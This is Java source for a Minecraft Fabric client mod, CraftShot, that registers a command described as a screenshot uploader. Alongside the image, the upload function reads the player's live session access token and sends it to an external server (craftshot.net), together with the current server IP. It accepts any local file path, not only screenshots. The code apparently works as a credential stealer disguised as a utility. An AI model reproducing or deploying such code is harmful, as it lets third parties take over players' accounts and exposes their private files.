package net.craftshot.command;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.context.CommandContext;
import net.fabricmc.fabric.api.client.command.v2.ClientCommandManager;
import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
import net.minecraft.ChatFormatting;
import net.minecraft.client.Minecraft;
import net.minecraft.network.chat.HoverEvent;
import net.minecraft.network.chat.ClickEvent;
import net.minecraft.network.chat.Component;
import net.minecraft.network.chat.MutableComponent;
import net.minecraft.util.Util;
import java.io.File;
import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.UUID;
import java.util.concurrent.CompletableFuture;

public class CraftShotCommand {

    private static final String API_URL = "https://craftshot.net/v2/upload";
    private static final HttpClient CLIENT = HttpClient.newHttpClient();

    public static void register(CommandDispatcher<FabricClientCommandSource> dispatcher) {
        dispatcher.register(ClientCommandManager.literal("craftshot")
                .then(ClientCommandManager.argument("file", StringArgumentType.greedyString()).executes(CraftShotCommand::executeUpload)));

        dispatcher.register(ClientCommandManager.literal("craftshot").then(ClientCommandManager.literal("copy").then(ClientCommandManager.argument("url", StringArgumentType.greedyString()).executes(CraftShotCommand::executeCopy))));
    }

    private static int executeUpload(CommandContext<FabricClientCommandSource> context) {
        String filePath = StringArgumentType.getString(context, "file");
        File uploadFile = new File(filePath);
        FabricClientCommandSource source = context.getSource();

        if (!uploadFile.exists()) {
            source.sendFeedback(getPrefix().append(Component.translatable("craftshot.command.invalidFile").withStyle(ChatFormatting.RED)));
            return 0;
        }

        String accessToken = Minecraft.getInstance().getUser().getAccessToken();
        if (accessToken.isEmpty()) {
            source.sendFeedback(getPrefix().append(Component.translatable("craftshot.command.invalidSession").withStyle(ChatFormatting.RED)));
            return 0;
        }

        source.sendFeedback(getPrefix().append(Component.translatable("craftshot.command.uploading").withStyle(ChatFormatting.GRAY)));

        String serverIp = "Singleplayer";
        if (Minecraft.getInstance().getCurrentServer() != null) {
            serverIp = Minecraft.getInstance().getCurrentServer().ip;
        }

        final String finalServerIp = serverIp;
        CompletableFuture.runAsync(() -> {
            try {
                uploadFile(uploadFile, accessToken, finalServerIp, source);
            } catch (Exception e) {
                e.printStackTrace();
                source.sendFeedback(getPrefix().append(Component.translatable("craftshot.command.failed").withStyle(ChatFormatting.RED)));
            }
        });

        return 1;
    }

    private static int executeCopy(CommandContext<FabricClientCommandSource> context) {
        String url = StringArgumentType.getString(context, "url");

        Minecraft.getInstance().keyboardHandler.setClipboard(url);

        context.getSource().sendFeedback(getPrefix().append(Component.translatable("craftshot.command.urlCopied").withStyle(ChatFormatting.GREEN)));
        return 1;
    }

    private static void uploadFile(File file, String token, String ip, FabricClientCommandSource source) throws IOException {
        String boundary = "CraftShotBoundary-" + UUID.randomUUID();
        byte[] fileBytes = Files.readAllBytes(file.toPath());

        byte[] body = createMultipartBody(boundary, token, ip, fileBytes, file.getName());

        HttpRequest request = HttpRequest.newBuilder().uri(URI.create(API_URL)).header("Content-Type", "multipart/form-data; boundary=" + boundary).header("User-Agent", "CraftShot-Fabric/1.0").POST(HttpRequest.BodyPublishers.ofByteArray(body)).build();

        CLIENT.sendAsync(request, HttpResponse.BodyHandlers.ofString()).thenAccept(response -> {
            if (response.statusCode() != 200) {
                source.sendFeedback(getPrefix().append(Component.translatable("craftshot.command.failed").withStyle(ChatFormatting.RED)));
                System.err.println("Upload failed: " + response.statusCode() + " - " + response.body());
                return;
            }

            try {
                JsonObject json = JsonParser.parseString(response.body()).getAsJsonObject();
                String url = json.getAsJsonObject("data").get("url").getAsString();

                MutableComponent successMsg = getPrefix()
                        .append(Component.translatable("craftshot.command.success").withStyle(ChatFormatting.GREEN))
                        .append(Component.literal(" "))
                        .append(Component.translatable("craftshot.command.copyUrl").withStyle(style -> style
                                .withColor(ChatFormatting.GOLD)
                                .withHoverEvent(new HoverEvent.ShowText(
                                        Component.translatable("craftshot.command.hoverCopyUrl").withStyle(ChatFormatting.GRAY)))
                                .withClickEvent(new ClickEvent.CopyToClipboard(url))
                        ));
                source.sendFeedback(successMsg);

                Util.getPlatform().openUri(url);
            } catch (Exception e) {
                e.printStackTrace();
                source.sendFeedback(getPrefix().append(Component.translatable("craftshot.command.failed").withStyle(ChatFormatting.RED)));
            }
        });
    }

    // --- HELPER: MULTIPART BODY ---
    private static byte[] createMultipartBody(String boundary, String token, String ip, byte[] fileBytes, String filename) {
        String dash = "--";
        String crlf = "\r\n";
        StringBuilder sb = new StringBuilder();

        // access_token
        sb.append(dash).append(boundary).append(crlf);
        sb.append("Content-Disposition: form-data; name=\"access_token\"").append(crlf).append(crlf);
        sb.append(token).append(crlf);

        // server_ip
        sb.append(dash).append(boundary).append(crlf);
        sb.append("Content-Disposition: form-data; name=\"server_ip\"").append(crlf).append(crlf);
        sb.append(ip).append(crlf);

        // screenshot file
        sb.append(dash).append(boundary).append(crlf);
        sb.append("Content-Disposition: form-data; name=\"screenshot\"; filename=\"").append(filename).append("\"").append(crlf);
        sb.append("Content-Type: image/png").append(crlf).append(crlf);

        try {
            byte[] header = sb.toString().getBytes(StandardCharsets.UTF_8);
            byte[] footer = (crlf + dash + boundary + dash + crlf).getBytes(StandardCharsets.UTF_8);

            byte[] complete = new byte[header.length + fileBytes.length + footer.length];
            System.arraycopy(header, 0, complete, 0, header.length);
            System.arraycopy(fileBytes, 0, complete, header.length, fileBytes.length);
            System.arraycopy(footer, 0, complete, header.length + fileBytes.length, footer.length);
            return complete;
        } catch (Exception e) {
            return new byte[0];
        }
    }

    private static MutableComponent getPrefix() {
        return Component.literal("§8[§6CraftShot§8] ");
    }
}